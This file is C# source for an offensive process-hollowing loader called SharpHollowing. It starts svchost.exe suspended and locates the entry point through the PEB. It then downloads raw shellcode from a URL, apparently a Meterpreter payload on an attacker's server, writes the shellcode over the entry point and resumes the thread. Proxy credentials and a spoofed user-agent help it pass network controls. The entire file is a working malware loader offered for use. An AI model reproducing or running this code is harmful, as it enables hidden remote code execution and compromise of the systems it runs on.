using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;

namespace SharpHollowing
{
    public class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]

        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWriten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);


        public static void Main(string[] args)
        {
            //Console.WriteLine("Start");
            //Console.WriteLine("Shell spawing");

            // #1 in order to call CreateProcess, we need to prepare param STARTUPINFO as a input with all default values
            STARTUPINFO si = new STARTUPINFO();
            // #2 pi is the output of CreateProcess
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // #3 0x4 CREATE_SUSPENDED
            bool res = CreateProcess(null, "C:\\Windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            // use ZwQueryInformationProcess for ProcessInformation, provide bi as PROCESS_BASIC_INFORMATION
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            // img base addr at bi+0x10
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            // read a value with length of a IntPtr, get the addr of imagebase
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            // convert the result to a ptr, this ptr is pointing to MZ file.
            // read approxiately 0x200 size of data, which should be enough to get PE info
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // 0x3c
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            // 0x28 to get rva
            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);


            // x64/meterpreter 443
            // byte[] buf = new byte[649] { ... };
            if (args.Length != 1)
            {
                Console.WriteLine("downloader.exe http://vpsip/bin.raw");
                return;
            }
            WebClient client = new WebClient();

            SetProxy(client);
            client.Headers.Add("user-agent", "Mozilla/4.0");

            byte[] buf = client.DownloadData(args[0]);

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
            //Console.WriteLine("End");
        }
        public static void SetProxy(WebClient webClient)
        {
            IWebProxy wp = WebRequest.DefaultWebProxy;
            wp.Credentials = CredentialCache.DefaultCredentials;
            webClient.Proxy = wp;
        }
    }
}
